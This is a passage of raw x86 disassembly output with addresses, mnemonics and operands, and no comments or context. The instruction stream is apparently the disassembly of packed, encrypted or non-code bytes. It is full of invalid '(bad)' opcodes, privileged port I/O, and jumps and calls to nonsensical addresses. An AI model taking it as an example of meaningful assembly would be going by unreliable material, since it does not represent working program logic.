  414bed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414bee:	xchg   BYTE PTR [ebp+0x40e8e8bb],bl
  414bf4:	mov    ebp,?
  414bf6:	out    0x28,al
  414bf8:	sub    dh,BYTE PTR [ebx+0x2dada122]
  414bfe:	mov    al,0xc8
  414c00:	push   ds
  414c01:	bound  ecx,QWORD PTR [esi-0x2efc3b28]
  414c07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c08:	popf   
  414c09:	sbb    dh,dl
  414c0b:	test   al,0xa9
  414c0d:	out    dx,al
  414c0e:	lock jg 0x414c4b
  414c11:	or     eax,0xa13e8d1b
  414c16:	cmp    bl,bh
  414c18:	jnp    0x414bde
  414c1a:	add    eax,0x78c42b1b
  414c1f:	repz pusha 
  414c21:	jl     0x414c1f
  414c23:	imul   esp,DWORD PTR ds:0x522acc35,0x9fe4de55
  414c2d:	fisttp WORD PTR [edx-0x1b9770bc]
  414c33:	push   ecx
  414c34:	pop    esi
  414c35:	dec    edx
  414c36:	data16 mov al,ds:0x51940afb
  414c3c:	push   es
  414c3d:	(bad)  [esi-0x60]
  414c40:	ja     0x414c53
  414c42:	popa   
  414c43:	sbb    bh,BYTE PTR [eax]
  414c45:	int3   
  414c46:	adc    eax,0xc7d17cd2
  414c4b:	in     eax,0x60
  414c4d:	fcomp  DWORD PTR [edx]
  414c4f:	jmp    0x141095ba
  414c54:	js     0x414cb9
  414c56:	push   DWORD PTR [ecx-0x67]
  414c59:	jg     0x414bfc
  414c5b:	push   es
  414c5c:	into   
  414c5d:	and    BYTE PTR [edx+0x88dcb68],cl
  414c63:	add    eax,0x9d1026bd
  414c68:	xchg   esi,eax
  414c69:	mov    ecx,0x414fa623
  414c6e:	shl    esp,0x85
  414c71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c72:	addr16 jge 0x414c79
  414c75:	rcl    DWORD PTR [ecx],cl
  414c77:	add    BYTE PTR ds:0xaa2a922e,bl
  414c7d:	inc    edi
  414c7e:	and    BYTE PTR [edi+0x71026f70],dl
  414c84:	repz xor ecx,DWORD PTR [edx+0x6773a6f4]
  414c8b:	dec    edi
  414c8c:	addr16 mov dh,0xaa
  414c8f:	daa    
  414c90:	pop    es
  414c91:	(bad)  
  414c92:	fwait
  414c93:	mov    es,WORD PTR [edi+ebx*2+0x348e5401]
  414c9a:	and    BYTE PTR [esi-0x6d],dh
  414c9d:	lods   al,BYTE PTR ds:[esi]
  414c9e:	call   0x636e8a13
  414ca3:	mov    ebp,0x401b4ff2
  414ca8:	xor    dl,0xa0
  414cab:	es call 0xe24c:0x480b6848
  414cb3:	cli    
  414cb4:	jge    0x414cc7
  414cb6:	arpl   WORD PTR [esi-0x1ba952e7],ax
  414cbc:	lock mov ebx,DWORD PTR [edi+0x2d1ac935]
  414cc3:	outs   dx,DWORD PTR ds:[esi]
  414cc4:	adc    ebx,DWORD PTR [eax]
  414cc6:	aaa    
  414cc7:	or     DWORD PTR [eax],ecx
  414cc9:	ret    
  414cca:	enter  0xd08d,0x52
  414cce:	and    ch,BYTE PTR [eax+0x1ee2c1dd]
  414cd4:	jmp    0x41525e
  414cd9:	mov    ah,0xb5
  414cdb:	xor    al,0xf
  414cdd:	xor    al,0x8e
  414cdf:	xor    al,0xb5
  414ce1:	or     dh,BYTE PTR [edx+0x26]
  414ce4:	je     0x414cdf
  414ce6:	push   ecx
  414ce7:	cwde   
  414ce8:	mov    dl,0x94
  414cea:	ror    DWORD PTR [esi+edx*1],cl
  414ced:	cmp    eax,0xd0161604
  414cf2:	mul    cl
  414cf4:	fucom  st(2)
  414cf6:	push   ds
  414cf7:	sub    eax,0xca3ee56
  414cfc:	sub    bl,BYTE PTR [ecx+0xc]
  414cff:	sbb    eax,0xf0b32f16
  414d04:	xor    DWORD PTR [edi],0x97f3f52f
  414d0a:	xchg   esp,eax
  414d0b:	cmp    eax,0xad1d377b
  414d11:	sub    DWORD PTR [ecx-0x3b],eax
  414d14:	xchg   ebx,eax
  414d15:	scas   al,BYTE PTR es:[edi]
  414d16:	retf   0xcf3c
  414d19:	or     cl,BYTE PTR [edi+eiz*1+0x65]
  414d1d:	test   al,0x4f
  414d1f:	push   DWORD PTR [esi]
  414d21:	pop    esp
  414d22:	jg     0x414cf4
  414d24:	test   BYTE PTR [edi],0x25
  414d27:	xchg   ebp,eax
  414d28:	out    dx,al
  414d29:	test   BYTE PTR [ecx+esi*2],dh
  414d2c:	push   ebp
  414d2d:	out    0xeb,eax
  414d2f:	jmp    0x414d24
  414d31:	ret    0xf48c
  414d34:	fsubr  DWORD PTR [esi-0x5bd9f448]
  414d3a:	arpl   WORD PTR fs:[esp+ecx*8-0x7f806f77],bx
  414d42:	ret    0x1c6
  414d45:	cdq    
  414d46:	and    al,0xa4
  414d48:	sbb    al,0x45
  414d4a:	in     al,dx
  414d4b:	xor    DWORD PTR [edi],eax
  414d4d:	sbb    edx,DWORD PTR [ebx-0x2a8acfc3]
  414d53:	xor    bh,0x1f
  414d56:	inc    esi
  414d57:	fwait
  414d58:	mov    ebp,0x7c31e33d
  414d5d:	cdq    
  414d5e:	sub    BYTE PTR [esi-0x59bc69bb],0x35
  414d65:	hlt    
  414d66:	ins    BYTE PTR es:[edi],dx
  414d67:	loope  0x414dc2
  414d69:	and    DWORD PTR [ecx+0x20],esi
  414d6c:	jb     0x414d27
  414d6e:	or     DWORD PTR [ecx+0xdef9240],0x243ee50b
  414d78:	xchg   esi,eax
  414d79:	cmp    eax,0xdb0a1db8
  414d7e:	lock retf 
  414d80:	dec    edi
  414d81:	mov    bl,0x77
  414d83:	mov    bh,BYTE PTR [edx-0x76]
  414d86:	rol    cl,0x9e
  414d89:	lds    edi,FWORD PTR [esp+ebx*4+0x15]
  414d8d:	icebp  
  414d8e:	xor    DWORD PTR [edx+0x55],esp
  414d91:	cmp    dh,bl
  414d93:	xor    BYTE PTR [ecx],bh
  414d95:	sbb    al,0x6e
  414d97:	lea    esp,[eax]
  414d99:	(bad)  
  414d9b:	and    bl,BYTE PTR [edx+eax*2-0x17c49bce]
  414da2:	lods   al,BYTE PTR ds:[esi]
  414da3:	inc    edi
  414da4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414da5:	in     al,0xa
  414da7:	jle    0x414df2
  414da9:	cli    
  414daa:	in     al,0x8a
  414dac:	xchg   edx,eax
  414dad:	enter  0xf6a0,0xb9
  414db1:	xor    edi,DWORD PTR [edx]
  414db3:	in     al,dx
  414db4:	push   si
  414db6:	adc    ah,BYTE PTR [ecx+0x4219cac4]
  414dbc:	mov    bl,0x7
  414dbe:	dec    ecx
  414dbf:	sbb    eax,0x3f3cd2c8
  414dc4:	call   0x775f50da
  414dc9:	imul   ebx,DWORD PTR [ecx-0x3c78d637],0xa1f8349b
  414dd3:	pop    edx
  414dd4:	div    DWORD PTR [edi+eax*2+0x1ad1074]
  414ddb:	data16 cli 
  414ddd:	mov    ecx,0x7c10ec2a
  414de2:	add    bl,BYTE PTR [edx-0x29]
  414de5:	dec    edi
  414de6:	sub    edx,DWORD PTR [edx+0x7bc77390]
  414dec:	lea    ecx,[edx+edx*1]
  414def:	or     eax,0x5388fd7b
  414df4:	les    edx,FWORD PTR [ecx]
  414df6:	icebp  
  414df7:	lds    ebx,FWORD PTR [edi-0x4f547e4d]
  414dfd:	out    dx,eax
  414dfe:	retf   0x4a6c
  414e01:	pop    edi
  414e02:	inc    ebp
  414e03:	mov    eax,0x734f73ec
  414e08:	je     0x414e6a
  414e0a:	mov    ecx,ds
  414e0c:	pop    edi
  414e0d:	xchg   BYTE PTR [eax],dl
  414e0f:	or     edx,DWORD PTR [esi+0x35]
  414e12:	aas    
  414e13:	aad    0x0
  414e15:	aam    0xbd
  414e17:	into   
  414e18:	push   eax
  414e19:	clc    
  414e1a:	jno    0x414dab
  414e1c:	aas    
  414e1d:	jns    0x414e79
  414e1f:	cmp    DWORD PTR gs:[edx],0xcb6a84f4
  414e26:	pop    ecx
  414e27:	imul   DWORD PTR [edi+0x34a35cef]
  414e2d:	inc    BYTE PTR [ebp-0x2a022fa3]
  414e33:	cmp    DWORD PTR [ecx-0x2a],eax
  414e36:	pop    esp
  414e37:	add    eax,0x8ab3c08c
  414e3c:	out    0x42,al
  414e3e:	add    BYTE PTR [esi+0x75],ah
  414e41:	sbb    bl,BYTE PTR [ebx]
  414e43:	(bad)  
  414e44:	push   ds
  414e45:	push   edx
  414e46:	iret   
  414e47:	data16 xlat BYTE PTR ds:[ebx]
  414e49:	imul   esp,DWORD PTR [eax],0x5b
  414e4c:	iret   
  414e4d:	mov    dh,bh
  414e4f:	adc    edx,edx
  414e51:	je     0x414e7b
  414e53:	dec    ebp
  414e54:	mov    esi,0xaf0f8a00
  414e59:	mov    ds:0xf4be08d1,eax
  414e5e:	or     eax,0x92801fac
  414e63:	push   cs
  414e64:	repz pop ebp
  414e66:	sub    DWORD PTR [eax+0x4e],eax
  414e69:	in     eax,dx
  414e6a:	xchg   esi,eax
  414e6b:	mov    al,ds:0xae946049
  414e70:	sub    al,0xc7
  414e72:	out    0x70,eax
  414e74:	lahf   
  414e75:	sub    dh,BYTE PTR [eax]
  414e77:	ficomp WORD PTR [ecx+0x588a7b14]
  414e7d:	xchg   BYTE PTR [edx+eiz*8+0x46],bl
  414e81:	pop    esp
  414e82:	lahf   
  414e83:	mov    dl,0xf3
  414e85:	or     al,0xa1
  414e87:	in     eax,0x60
  414e89:	addr16 cmp cl,bh
  414e8c:	cmp    eax,ebp
  414e8e:	sbb    al,0xa
  414e90:	lods   eax,DWORD PTR ds:[esi]
  414e91:	jecxz  0x414e90
  414e93:	aaa    
  414e94:	push   ds
  414e95:	ret    0xef8d
  414e98:	jp     0x414e59
  414e9a:	loope  0x414e34
  414e9c:	sbb    ah,BYTE PTR [esi-0x3b6bd582]
  414ea2:	xor    DWORD PTR [ebx-0x4b30ed39],esi
  414ea8:	adc    al,0xd9
  414eaa:	lods   al,BYTE PTR ds:[esi]
  414eab:	sub    al,0x4a
  414ead:	pop    eax
  414eae:	in     al,0x9f
  414eb0:	add    BYTE PTR [edi-0x6e685f75],al
  414eb6:	push   ecx
  414eb7:	shrd   DWORD PTR [edi+0x57],ebx,cl
  414ebb:	push   0xffffffa5
  414ebd:	mov    esp,0x2672509a
  414ec2:	or     ebp,DWORD PTR [edx-0x34]
  414ec5:	mov    cl,dl
  414ec7:	dec    esp
  414ec9:	jmp    0x4f09:0x8c24e8fe
  414ed0:	jno    0x414e59
  414ed2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ed3:	aas    
  414ed4:	pop    es
  414ed5:	addr16 sbb al,0xb2
  414ed8:	addr16 push esp
  414eda:	xchg   ebx,eax
  414edb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414edc:	and    DWORD PTR [ecx-0x2c8993b8],0x82f9805c
  414ee6:	jnp    0x414ee8
  414ee8:	ja     0x414f66
  414eea:	inc    eax
  414eeb:	mov    cl,0xdf
  414eed:	push   es
  414eee:	outs   dx,BYTE PTR ds:[esi]
  414eef:	dec    ecx
  414ef0:	push   0xffffffcb
  414ef2:	(bad)  
  414ef3:	cld    
  414ef4:	pusha  
  414ef5:	fild   WORD PTR [esi]
  414ef7:	mov    dh,0xa1
  414ef9:	sub    eax,0x719b64d6
  414efe:	jb     0x414f5f
  414f00:	inc    esi
  414f01:	loopne 0x414f1a
  414f03:	jbe    0x414f75
  414f05:	inc    esp
  414f06:	out    0x26,eax
  414f08:	xor    al,0x38
  414f0a:	push   0x2372af62
  414f0f:	idiv   eax
  414f11:	and    al,0x57
  414f13:	pop    ecx
  414f14:	mov    ds:0x5690be95,eax
  414f19:	ret    0x685e
  414f1c:	(bad)  
  414f1d:	jbe    0x414f8e
  414f1f:	push   cs
  414f20:	sub    al,0xa
  414f22:	xchg   ecx,eax
  414f23:	out    0xd8,eax
  414f25:	add    DWORD PTR [edx],esi
  414f27:	adc    eax,0x612e738b
  414f2c:	scas   eax,DWORD PTR es:[edi]
  414f2d:	pop    ebp
  414f2e:	leave  
  414f2f:	cmp    bl,0x73
  414f32:	clc    
  414f33:	js     0x414eb7
  414f35:	xor    al,0x9e
  414f37:	pop    esi
  414f38:	cli    
  414f39:	leave  
  414f3a:	sub    bx,WORD PTR [eax]
  414f3d:	cdq    
  414f3e:	ins    DWORD PTR es:[edi],dx
  414f3f:	gs arpl cx,bp
  414f42:	test   al,0x57
  414f44:	loope  0x414f8b
  414f46:	pushf  
  414f47:	cmp    eax,0xee442807
  414f4c:	adc    ebp,esp
  414f4e:	cmp    BYTE PTR ds:0x3fa29fc1,bl
  414f54:	pop    edx
  414f55:	test   al,0xd7
  414f57:	xchg   esp,eax
  414f58:	sbb    al,0xd5
  414f5a:	and    DWORD PTR [esi+0x65],esi
  414f5d:	aaa    
  414f5e:	and    esp,DWORD PTR [ebx]
  414f60:	xchg   ebx,eax
  414f61:	xor    eax,0x53e8ed30
  414f66:	aad    0x3e
  414f68:	bound  esi,QWORD PTR [ecx-0x794c007c]
  414f6e:	inc    esi
  414f6f:	jecxz  0x414f4d
  414f71:	jb     0x414f04
  414f73:	inc    eax
  414f74:	push   edi
  414f75:	test   BYTE PTR [eax+0x2],0xd6
  414f79:	dec    BYTE PTR [ebp-0x70315872]
  414f7f:	dec    ebx
  414f80:	test   eax,0xc09d103c
  414f85:	sbb    esi,DWORD PTR [esi-0x62]
  414f88:	pop    edx
  414f89:	jg     0x414f4b
  414f8b:	mov    cl,0xbd
  414f8d:	push   ebp
  414f8e:	imul   edx,DWORD PTR [ebp-0x949008e],0x37293e78
  414f98:	sub    BYTE PTR [eax-0x80],ch
  414f9b:	cdq    
  414f9c:	cmp    DWORD PTR [ecx-0x18],ebp
  414f9f:	mov    esp,0xbfe09d1f
  414fa4:	pop    ebx
  414fa5:	fistp  DWORD PTR [edx]
  414fa7:	shl    BYTE PTR ds:0xc2553ba1,1
  414fad:	idiv   DWORD PTR [ebx+0x57dfe349]
  414fb3:	dec    eax
  414fb4:	adc    BYTE PTR [eax-0x6],ch
  414fb7:	dec    edx
  414fb8:	jmp    0x414fa0
  414fba:	jbe    0x41502b
  414fbc:	and    DWORD PTR [edi+0x1bb3dd5b],esi
  414fc2:	push   ebx
  414fc3:	cmp    DWORD PTR [edi-0x22],0xb41171ca
  414fca:	mov    edx,0x6042846c
  414fcf:	icebp  
  414fd0:	mov    edx,0x66db688f
  414fd5:	mov    ds,WORD PTR [ecx+0x763712e2]
  414fdb:	fisub  DWORD PTR [edi-0x68c236df]
  414fe1:	xchg   ebx,eax
  414fe2:	hlt    
  414fe3:	jecxz  0x414f84
  414fe5:	or     eax,0xc2a1b09e
  414fea:	out    0xd6,eax
  414fec:	push   ebx
  414fed:	or     BYTE PTR [edx],al
  414fef:	jmp    0x1fe5c6b2
  414ff4:	cmp    eax,0xd5fde13f
  414ff9:	mov    dl,0xba
  414ffb:	cmp    ebx,DWORD PTR [edi-0x77897189]
  415001:	jno    0x414ff5
  415003:	fld    QWORD PTR [ebp-0x16]
  415006:	adc    ebx,DWORD PTR [esi+0x718b5f06]
  41500c:	or     DWORD PTR [edx+edi*2],edx
  41500f:	and    DWORD PTR [eax+0xb],ebp
  415012:	jp     0x41502c
  415014:	mov    cl,0x83
  415016:	(bad)  
  415017:	fdiv   QWORD PTR [esp+ecx*4-0x465c6c2]
  41501e:	adc    eax,0x8c1c7011
  415023:	lods   al,BYTE PTR ds:[esi]
  415024:	mov    esi,0x5ef40e1e
  415029:	stos   BYTE PTR es:[edi],al
  41502a:	pop    esi
  41502b:	or     al,0xce
  41502d:	sub    edi,DWORD PTR [ecx-0x75877694]
  415033:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415034:	sub    cl,ah
  415036:	rol    DWORD PTR [eax+edx*8],cl
  415039:	inc    edx
  41503a:	imul   ebx,DWORD PTR [bx+si+0x446d],0x890ef324
  415043:	mov    al,ds:0x928a7f57
  415048:	fdivr  QWORD PTR [ecx+0x6f45c53e]
  41504e:	adc    al,0x39
  415050:	or     al,0xf2
  415052:	adc    eax,0x3910d020
  415057:	xor    bl,BYTE PTR [edx-0x53]
  41505a:	or     BYTE PTR [ebp+0x1d2bb1f5],ch
  415060:	adc    edi,edi
  415062:	or     al,bh
  415064:	pusha  
  415065:	pop    ebx
  415066:	icebp  
  415067:	inc    ecx
  415068:	mov    dh,0x5d
  41506a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41506b:	mov    edx,0xb52e2e6b
  415070:	jp     0x415040
  415072:	or     DWORD PTR [eax+0x63],eax
  415075:	in     al,0x1b
  415077:	push   edx
  415078:	push   0x9629e145
  41507d:	inc    esp
  41507e:	outs   dx,BYTE PTR ds:[esi]
  41507f:	ret    
  415080:	sub    ah,cl
  415082:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415083:	(bad)  
  415084:	mov    BYTE PTR ss:[eax+edx*4+0x36],ah
  415089:	arpl   WORD PTR [edi+0x49],si
  41508c:	lods   eax,DWORD PTR ds:[esi]
  41508d:	sti    
  41508e:	or     BYTE PTR [eax],0x5b
  415091:	lds    esi,FWORD PTR ds:0x6fe0b445
  415097:	loop   0x415104
  415099:	sub    al,BYTE PTR [edi-0x4c]
  41509c:	jbe    0x4150bb
  41509e:	sbb    esp,DWORD PTR [ecx-0x597df7a2]
  4150a4:	jae    0x415052
  4150a6:	je     0x4150bd
  4150a8:	fwait
  4150a9:	jp     0x415058
  4150ab:	push   edi
  4150ac:	jnp    0x415030
  4150ae:	adc    edx,DWORD PTR [eax]
  4150b0:	xchg   ecx,eax
  4150b1:	push   0xffffffcc
  4150b3:	aas    
  4150b4:	cli    
  4150b5:	arpl   WORD PTR [esi+0x56ce05f5],si
  4150bb:	idiv   DWORD PTR ds:0xc2597477
  4150c1:	es dec ecx
  4150c3:	cs and esp,edi
  4150c6:	sub    al,0x99
  4150c8:	cmc    
  4150c9:	pop    edi
  4150ca:	add    dl,BYTE PTR [ebp-0x289caf81]
  4150d0:	xor    edx,0xfffffff1
  4150d3:	data16 int3 
  4150d5:	and    eax,DWORD PTR [ebx]
  4150d7:	mov    ds:0x83400f8a,al
  4150dc:	loope  0x4150a2
  4150de:	test   al,0xaa
  4150e0:	add    DWORD PTR [ebx],ebx
  4150e2:	push   ebx
  4150e3:	mov    ah,0xec
  4150e5:	dec    ebx
  4150e6:	push   ds
  4150e7:	or     DWORD PTR [ebp+0x4],esp
  4150ea:	in     al,dx
  4150eb:	or     esi,DWORD PTR [edx]
  4150ed:	jne    0x41507a
  4150ef:	mov    edi,ebp
  4150f1:	addr16 sbb edi,eax
  4150f4:	xor    al,0xe7
  4150f6:	cmp    ah,al
  4150f8:	xor    edx,0x39
  4150fb:	loopne 0x415099
  4150fd:	out    0x12,al
  4150ff:	pop    ebx
  415100:	mov    dh,0xe6
  415102:	sbb    eax,ecx
  415104:	sti    
  415105:	aad    0x5e
  415107:	push   eax
  415108:	mov    WORD PTR ds:0x6fa0afe9,cs
  41510e:	inc    edx
  41510f:	adc    eax,0x97532471
  415114:	lods   eax,DWORD PTR ds:[esi]
  415115:	push   ebp
  415116:	push   ebx
  415117:	and    edi,DWORD PTR ds:0x61f12b79
  41511d:	mov    ecx,0x307152e2
  415122:	(bad)  
  415124:	adc    al,0x8e
  415126:	and    bl,BYTE PTR [esi]
  415128:	cdq    
  415129:	dec    esp
  41512a:	jp     0x415156
  41512c:	cwde   
  41512d:	push   ecx
  41512e:	dec    esi
  41512f:	and    al,0xab
  415131:	adc    al,0xee
  415133:	jo     0x4151ac
  415135:	lea    edx,[ecx+0x2110ddb5]
  41513b:	out    dx,al
  41513c:	call   0xd7e6:0x2525454d
  415143:	lods   al,BYTE PTR ds:[esi]
  415144:	imul   eax,DWORD PTR ds:0x8b226178,0x442dddc4
  41514e:	dec    edx
  41514f:	add    dh,ch
  415151:	enter  0x3b7d,0x7e
  415155:	out    0x48,eax
  415157:	scas   eax,DWORD PTR es:[edi]
  415158:	inc    esp
  415159:	enter  0x62e7,0xd1
  41515d:	cmp    BYTE PTR [ecx+0x3e570504],al
  415163:	fimul  WORD PTR [ebx+eax*2-0x67]
  415167:	mov    ds:0x1b912b7d,eax
  41516c:	mov    esi,DWORD PTR [edx]
  41516e:	dec    esi
  41516f:	add    dh,BYTE PTR ds:0x8813720
  415175:	push   0xe
  415177:	mov    bh,0x53
  415179:	jmp    0x41519a
  41517b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41517c:	ror    DWORD PTR [ecx-0x279596f3],cl
  415182:	add    bh,BYTE PTR [edi+0x6d1a5e31]
  415188:	int3   
  415189:	clc    
  41518a:	mov    ds:0xdcd11b79,al
  41518f:	pop    edx
  415190:	pop    ecx
  415191:	and    al,0x9c
  415193:	in     al,dx
  415194:	mov    bl,0xe7
  415196:	adc    BYTE PTR [esi-0x3ca9154d],dl
  41519c:	adc    DWORD PTR [edi-0x14c72fd],ecx
  4151a2:	mov    ds:0x85691d8c,al
  4151a7:	pop    ds
  4151a8:	pop    ss
  4151a9:	sub    BYTE PTR [ebx],bl
  4151ab:	mov    dh,BYTE PTR [esi]
  4151ad:	scas   al,BYTE PTR es:[edi]
  4151ae:	aas    
  4151af:	out    0x29,al
  4151b1:	pop    edx
  4151b2:	dec    eax
  4151b3:	ins    BYTE PTR es:[edi],dx
  4151b4:	xlat   BYTE PTR ds:[ebx]
  4151b5:	in     eax,dx
  4151b6:	xchg   ecx,eax
  4151b7:	retf   0x7da1
  4151ba:	in     eax,dx
  4151bb:	mov    al,ds:0xd9ff041d
  4151c0:	xor    bh,BYTE PTR [ecx-0x45170768]
  4151c6:	mov    WORD PTR [esi-0x2b],gs
  4151c9:	popf   
  4151ca:	add    al,0x4
  4151cc:	mov    bh,0x34
  4151ce:	dec    ecx
  4151cf:	pop    edx
  4151d0:	or     BYTE PTR [ebp-0xc75fdd0],bl
  4151d6:	test   al,0x1f
  4151d8:	fxrstor [esi-0x68]
  4151dc:	dec    edi
  4151dd:	enter  0xfca,0xd4
  4151e1:	mov    eax,0x215dd161
  4151e6:	mov    WORD PTR [edi+0xeb4030],gs
  4151ec:	xor    al,0xc4
  4151ee:	in     al,dx
  4151ef:	ja     0x415190
  4151f1:	sub    al,bh
  4151f3:	aas    
  4151f4:	xchg   ecx,eax
  4151f5:	imul   edx,DWORD PTR [ebx-0x6c72382f],0x7f
  4151fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4151fd:	leave  
  4151fe:	mov    dl,0x7c
  415200:	add    DWORD PTR [eax+esi*1+0x25],esi
  415204:	xor    eax,0x39655d6f
  415209:	cld    
  41520a:	mov    ch,0x15
  41520c:	inc    esp
  41520d:	(bad)  
  41520e:	clts   
  415210:	das    
  415211:	push   0xffffffaa
  415213:	mov    ds:0x703d8e5f,eax
  415218:	sub    DWORD PTR [edx+edi*1+0xb],0x516a1154
  415220:	fmul   QWORD PTR [edi+0x5f]
  415223:	jg     0x4151e1
  415225:	lods   al,BYTE PTR ds:[esi]
  415226:	fsub   QWORD PTR [edi]
  415228:	and    al,0xa5
  41522a:	push   0xffffffe5
  41522c:	mov    WORD PTR [eax-0x2c7f3d5],es
  415232:	or     dh,al
  415234:	out    0xdc,al
  415236:	sub    ah,BYTE PTR [edi+ebx*2-0x2401101a]
  41523d:	mov    esp,0xf6bad829
  415242:	adc    edx,esp
  415244:	xor    al,0xb3
  415246:	adc    esi,esi
  415248:	loopne 0x41529a
  41524a:	fmul   DWORD PTR [edi-0xeda6c46]
  415250:	shl    DWORD PTR [ecx],1
  415252:	ret    
  415253:	mov    eax,ds:0xb94a1ccf
  415258:	xor    eax,0x393e19e9
  41525d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41525e:	mov    eax,0xc0000000
  415263:	xor    edx,eax
  415265:	mov    DWORD PTR [ebp+0x14],edx
  415268:	mov    edx,DWORD PTR [esi]
  41526a:	mov    edi,DWORD PTR [esi+0x4]
  41526d:	xor    edi,0x9c0a89d8
  415273:	jmp    0x4157fd
  415278:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415279:	(bad)  
  41527a:	outs   dx,DWORD PTR ds:[esi]
  41527b:	test   DWORD PTR [ebp+0x24],esp
  41527e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41527f:	ss das 
  415281:	sahf   
  415282:	cmp    BYTE PTR [eax+0x57],ch
  415285:	xchg   ebp,eax
  415286:	sbb    BYTE PTR [eax+0x160ccfc3],ch
  41528c:	cmp    eax,0xd9161604
  415291:	inc    ecx
  415292:	fistp  DWORD PTR [edi]
  415294:	in     al,dx
  415295:	aaa    
  415296:	fdivr  QWORD PTR [ecx+ecx*2-0x6c]
  41529a:	ins    DWORD PTR es:[edi],dx
  41529b:	js     0x4152ad
  41529d:	sub    dl,BYTE PTR [edx+0x5]
  4152a0:	and    DWORD PTR [ebx+ecx*2+0x142fc5a3],edi
  4152a7:	gs pop edi
  4152a9:	mov    edi,0x67e36c6e
  4152ae:	and    DWORD PTR [eax-0x7f2d3d63],esi
  4152b4:	(bad)  
  4152b5:	jns    0x4152ac
  4152b7:	inc    eax
  4152b8:	push   esp
  4152b9:	add    BYTE PTR [edi-0x322db530],bl
  4152bf:	lock sahf 
  4152c1:	stc    
  4152c2:	sub    DWORD PTR [di-0x5567],ebx
  4152c7:	mov    ebp,DWORD PTR [edi+0x1d]
  4152ca:	lock das 
  4152cc:	jnp    0x41527b
  4152ce:	mov    BYTE PTR [ebx],ch
  4152d0:	push   esi
  4152d1:	add    eax,0xeb4d4389
  4152d6:	cwde   
  4152d7:	out    0xea,al
  4152d9:	sub    DWORD PTR [ebx-0x290888b],edx
  4152df:	push   0x5b
  4152e1:	adc    DWORD PTR [esi+0x70ac0c2b],ebx
  4152e7:	(bad)  
  4152e8:	xchg   ebp,eax
  4152e9:	(bad)  
  4152ea:	pop    ebx
  4152eb:	(bad)  
  4152ec:	pop    ds
  4152ed:	(bad)  
  4152ee:	xchg   edi,eax
  4152ef:	enter  0xffb9,0x53
  4152f3:	rcl    DWORD PTR [eax+ebp*2-0x5bf72601],cl
  4152fa:	jge    0x415343
  4152fc:	mov    DWORD PTR [esi+esi*8-0x2b64143b],esp
  415303:	lea    edx,[ebp+0x208a0458]
  415309:	or     DWORD PTR [edx+0x7c8f8f2d],eax
  41530f:	push   ecx
  415310:	scas   al,BYTE PTR es:[edi]
  415311:	inc    edi
  415312:	or     ecx,edx
  415314:	cmp    edx,DWORD PTR [edi-0xfb46270]
  41531a:	rol    BYTE PTR [ecx-0x1d6af701],cl
  415320:	mov    ds:0x2a569a5f,eax
  415325:	pop    ss
  415326:	xchg   ecx,eax
  415327:	call   0x75be:0xfb7abe66
  41532e:	mov    WORD PTR ds:0x6ad81fa7,?
  415334:	inc    BYTE PTR ds:0x6ec3eddf
  41533a:	mov    dh,0xe5
  41533c:	cmp    DWORD PTR [esi+0x41],ebp
  41533f:	add    bl,BYTE PTR [edi+0x2a]
  415342:	mov    ds:0xebd057a3,al
  415347:	inc    edx
  415348:	xor    ecx,DWORD PTR ds:0x8fae2410
  41534e:	jl     0x4153a7
  415350:	xor    al,0xe4
  415352:	(bad)  
  415353:	xor    dl,BYTE PTR [edi]
  415355:	mov    esi,0x507edd61
  41535a:	push   esp
  41535b:	(bad)  
  41535c:	mov    eax,ds:0x1507596c
  415361:	add    eax,0x9f3ab7a6
  415366:	mov    WORD PTR [eax+eax*2],cs
  415369:	cmp    DWORD PTR [ebx+0x1c],eax
  41536c:	jno    0x41535b
  41536e:	js     0x4153b9
  415370:	mov    dl,0x9b
  415372:	or     DWORD PTR [eax+esi*8+0x1cd78085],ebx
  415379:	les    ebp,FWORD PTR [edi-0x323f5f64]
  41537f:	scas   al,BYTE PTR es:[edi]
  415380:	imul   cl
  415382:	pop    esi
  415383:	push   esi
  415384:	aad    0xd6
  415386:	dec    ecx
  415387:	stos   DWORD PTR es:[edi],eax
  415388:	inc    bh
  41538a:	imul   ecx
  41538c:	arpl   WORD PTR [eax-0x7e],si
  41538f:	stc    
  415390:	fstp   DWORD PTR [eax]
  415392:	pop    edi
  415393:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415394:	call   0x7907:0xa62ad13
  41539b:	es push edx
  41539e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41539f:	mov    eax,ds:0x33a40035
  4153a4:	push   ebp
  4153a5:	test   ah,cl
  4153a7:	or     edi,DWORD PTR [ebx-0x41d5e042]
  4153ad:	xor    DWORD PTR [ebp-0xa],esp
  4153b0:	mov    eax,ds:0x292a174e
  4153b5:	pop    ebp
  4153b6:	in     eax,0xd0
  4153b8:	outs   dx,BYTE PTR ds:[esi]
  4153b9:	sub    al,0x2f
  4153bb:	mov    eax,ds:0xb526ffe3
  4153c0:	and    cl,BYTE PTR ds:0x1dd84134
  4153c6:	jo     0x415377
  4153c8:	mov    dh,ah
  4153ca:	shl    BYTE PTR [eax-0x2ce2ff3f],1
  4153d0:	inc    edx
  4153d1:	(bad)  
  4153d2:	outs   dx,DWORD PTR ds:[esi]
  4153d3:	call   0xf4ff668c
  4153d8:	cli    
  4153d9:	xchg   esp,eax
  4153da:	mov    cs,WORD PTR [esi+0x0]
  4153dd:	stos   BYTE PTR es:[edi],al
  4153de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4153df:	(bad)  
  4153e0:	rcr    ch,1
  4153e2:	xchg   esp,eax
  4153e3:	mov    dl,BYTE PTR [eax+ebx*2]
  4153e6:	shr    DWORD PTR [eax],cl
  4153e8:	or     bh,BYTE PTR [edx]
  4153ea:	push   ebx
